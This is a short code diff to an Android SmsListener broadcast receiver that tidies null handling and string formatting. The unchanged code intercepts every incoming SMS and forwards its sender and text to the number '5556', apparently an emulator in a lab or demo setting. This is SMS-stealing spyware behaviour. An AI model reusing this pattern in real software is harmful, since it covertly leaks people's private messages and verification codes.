@@ -19,7 +19,6 @@ public class SmsListener extends BroadcastReceiver {
 
     @Override
     public void onReceive(Context context, Intent intent) {
-
         //Intercept incoming SMS
         SmsManager smsManager = SmsManager.getDefault();
         Bundle myBundle = intent.getExtras();
@@ -27,7 +26,9 @@ public class SmsListener extends BroadcastReceiver {
         if (myBundle != null) {
             Object[] pdus = (Object[]) myBundle.get("pdus");
 
-            assert pdus != null;
+            if (pdus == null)
+                return;
+
             SmsMessage[] messages = new SmsMessage[pdus.length];
 
             for (int i = 0; i < messages.length; i++) {
@@ -43,7 +44,6 @@ public class SmsListener extends BroadcastReceiver {
                 String smsMessageStr = "SMS from the app: " + messages[i].getOriginatingAddress();
                 smsMessageStr += " : ";
                 smsMessageStr += messages[i].getMessageBody();
-                smsMessageStr += "\n";
 
                 //Forwarding the Message
                 smsManager.sendTextMessage("5556", null, smsMessageStr, null, null);
